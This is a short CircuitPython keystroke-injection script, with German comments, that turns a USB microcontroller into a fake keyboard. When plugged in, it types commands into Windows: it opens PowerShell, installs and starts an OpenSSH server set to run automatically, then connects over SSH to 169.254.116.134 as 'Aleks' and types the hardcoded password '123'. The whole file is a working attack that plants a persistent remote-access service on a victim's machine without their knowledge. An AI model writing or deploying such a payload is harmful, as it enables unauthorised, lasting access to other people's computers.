import usb_hid
import time
from adafruit_hid.keyboard import Keyboard
from adafruit_hid.keycode import Keycode

# Initialisiere die Tastatur
kbd = Keyboard(usb_hid.devices)

time.sleep(1)  # Warte, bis der Computer bereit ist

# Öffne PowerShell
kbd.send(Keycode.WINDOWS, Keycode.R)
time.sleep(0.5)
kbd.write("powershell\n")
time.sleep(1)

# Installiere SSH-Client
kbd.write("Add-WindowsCapability -Online -Name OpenSSH.Client*\n")
time.sleep(5)  # Warte, bis der Befehl ausgeführt wird

# Installiere SSH-Server
kbd.write("Add-WindowsCapability -Online -Name OpenSSH.Server*\n")
time.sleep(5)

# Starte den SSH-Server
kbd.write("Start-Service sshd\n")
time.sleep(2)

# Setze den SSH-Server auf Autostart
kbd.write("Set-Service -Name sshd -StartupType 'Automatic'\n")
time.sleep(2)

# SSH-Verbindung herstellen
kbd.write("ssh Aleks@169.254.116.134\n")
time.sleep(0.5)

# Passwort eingeben (falls nötig)
kbd.write("123\n")
